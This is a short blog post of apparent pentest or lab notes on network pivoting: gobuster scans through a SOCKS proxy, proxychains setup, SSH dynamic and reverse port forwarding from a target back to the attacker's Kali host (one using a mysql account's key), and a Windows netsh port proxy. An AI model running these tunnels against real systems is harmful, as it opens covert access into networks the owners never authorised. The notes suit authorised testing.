---
layout: post
title:  "networking - linux - proxychains - port forwarding"
date:   2022-01-01
categories: networking
---

### directory scan

```bash
gobuster dir -u http://10.10.10.10 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --proxy socks5://<my ip>:9050 -x .php,.txt
```

### Configure Proxychains

```bash

┌──(kali㉿Zeus)-[~]
└─$ cat /etc/proxychains.conf | grep 9050
socks5 <your VPN IP> 9050

```

### Proxychains through SSH connection dynamic port forwarding


```bash

ssh -D <your VPN IP>:9050 -i id_rsa root@10.10.10.10

```

## remote port forwarding two specific ports 22 and 3306 

```bash
ssh-keygen
ssh -f -N -R 1122:<targetip>:22 -R 13306:<targetip>:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" kali@myip -i /tmp/.ssh/id_rsa
```

## dynamic remote port forwading

```bash
ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /var/lib/mysql/.ssh/id_rsa kali@myip
```

### Directory Scan through proxy


```bash

gobuster dir --proxy socks5://<your VPN IP>:9050 --url http://<ip> -w /usr/share/wordlists/dirb/common.txt

```


### Resources

```

https://abrictosecurity.com/how-to-use-proxychains/

```

### netsh windows port forward

 listening on 10.10.10.10 (listenaddress=10.10.10.10), port 4455 (listenport=4455) that will forward to the (connectaddress=10.10.10.20) on port 445 (connectport=445):

```bash
netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.10.10.10 connectport=445 connectaddress=10.10.10.20
```


